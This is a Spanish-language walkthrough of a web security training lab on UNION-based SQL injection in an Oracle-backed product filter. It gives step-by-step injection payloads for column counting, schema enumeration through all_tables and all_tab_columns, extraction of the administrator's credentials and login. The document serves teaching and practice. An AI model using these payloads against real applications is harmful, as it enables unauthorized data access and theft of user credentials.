# 💉 Enumeración de bases de datos en Oracle

## 📄 Descripción del laboratorio

Este laboratorio contiene una vulnerabilidad de **inyección SQL** en el filtro de categorías de productos. Como los resultados de la consulta se reflejan directamente en la respuesta, es posible utilizar un **ataque UNION SELECT** para enumerar información del esquema de la base de datos y extraer datos sensibles.

El objetivo es identificar la tabla que almacena usuarios, obtener las credenciales del usuario **administrator** y utilizar esa información para iniciar sesión en la aplicación.



## 📚 Teoría

### 📌 Enumeración del esquema en Oracle

Cuando se explota una SQL Injection en Oracle, existen algunas diferencias respecto a otros motores de base de datos.

Primero, Oracle requiere siempre una tabla en las consultas `SELECT`. Para ejecutar consultas simples se utiliza la tabla especial:

```
dual
```

Además, Oracle no utiliza `information_schema` para almacenar metadatos de la base de datos. En su lugar, proporciona vistas internas como:

```
all_tables
all_tab_columns
```

Estas vistas permiten enumerar:

* Tablas accesibles por el usuario actual.
* Columnas de cada tabla.

El flujo típico de explotación en Oracle es el siguiente:

1. Determinar el número de columnas de la consulta vulnerable.
2. Confirmar qué columnas aceptan datos de tipo texto.
3. Enumerar tablas utilizando `all_tables`.
4. Identificar la tabla que contiene los usuarios.
5. Enumerar sus columnas mediante `all_tab_columns`.
6. Extraer los valores de usuario y contraseña.



## 📝 Práctica

### 1️⃣ Determinar el número de columnas

Interceptamos la petición del filtro de categorías y la enviamos a **Burp Repeater**.

Probamos con `ORDER BY`:

```
/filter?category=' ORDER BY 1--
/filter?category=' ORDER BY 2--
/filter?category=' ORDER BY 3--
```

Resultados:

```
ORDER BY 1 → funciona
ORDER BY 2 → funciona
ORDER BY 3 → error
```

Conclusión: la consulta original devuelve **2 columnas**.

### 2️⃣ Confirmar columnas de texto

En Oracle necesitamos utilizar `FROM dual` incluso en consultas simples.

Probamos el siguiente payload:

```
/filter?category=' UNION SELECT 'test','test' FROM dual--
```

<img width="1520" height="963" alt="image" src="https://github.com/user-attachments/assets/41f55556-0e05-4646-bbff-e143966325d1" />
<br>

Resultado:

La respuesta muestra una fila adicional con los valores inyectados.

Conclusión:

* La consulta tiene **2 columnas**.
* Ambas columnas aceptan **datos de tipo texto**.



### 3️⃣ Enumerar las tablas de la base de datos

Utilizamos la vista `all_tables` para listar las tablas accesibles:

```
/filter?category=' UNION SELECT NULL,table_name FROM all_tables--
```

<img width="1337" height="990" alt="image" src="https://github.com/user-attachments/assets/00a2c36f-d6b1-4aed-afa4-0d581055fc8f" />
<br>

La respuesta muestra múltiples tablas.

Entre ellas aparece una tabla con nombre sospechoso, por ejemplo:

```
USERS_RJMQEK
```

Este tipo de nombre ofuscado es habitual en los laboratorios para evitar la identificación directa.



### 4️⃣ Enumerar las columnas de la tabla de usuarios

Una vez identificada la tabla de usuarios, enumeramos sus columnas:

```
/filter?category=' UNION SELECT NULL,column_name 
FROM all_tab_columns 
WHERE table_name='USERS_RJMQEK'--
```

<img width="1520" height="870" alt="image" src="https://github.com/user-attachments/assets/12ae3e3a-9a98-4a26-ace2-b4a4bb1a1066" />
<br>

Resultado:

```
USERNAME_KWMKKM
PASSWORD_YGAKVD
```

Los nombres también están ofuscados, pero su función es clara.



### 5️⃣ Extraer usuarios y contraseñas

Con los nombres exactos de la tabla y columnas podemos extraer los datos reales.

Payload utilizado:

```
/filter?category=' UNION SELECT USERNAME_KWMKKM,PASSWORD_YGAKVD 
FROM USERS_RJMQEK--
```

<img width="1233" height="725" alt="image" src="https://github.com/user-attachments/assets/a1fc2587-d5a7-40cc-8a68-37a6ca09be2a" />
<br>

La respuesta muestra varias filas, incluyendo:

```
administrator : contraseña_del_admin
```



### 6️⃣ Iniciar sesión como administrador

Accedemos al formulario de login de la aplicación e introducimos:

```
Usuario: administrator
Contraseña: contraseña_del_admin
```

La autenticación es exitosa.

<img width="1233" height="725" alt="image" src="https://github.com/user-attachments/assets/d1ee2e18-f949-4581-9a3e-3e9e5950593a" />



### 7️⃣ Resultado

Mediante el ataque UNION se ha conseguido:

* Determinar el número de columnas de la consulta.
* Confirmar columnas compatibles con texto.
* Enumerar tablas mediante `all_tables`.
* Enumerar columnas con `all_tab_columns`.
* Extraer credenciales de usuario.
* Iniciar sesión como **administrator**.

✅ El laboratorio se marca como completado.
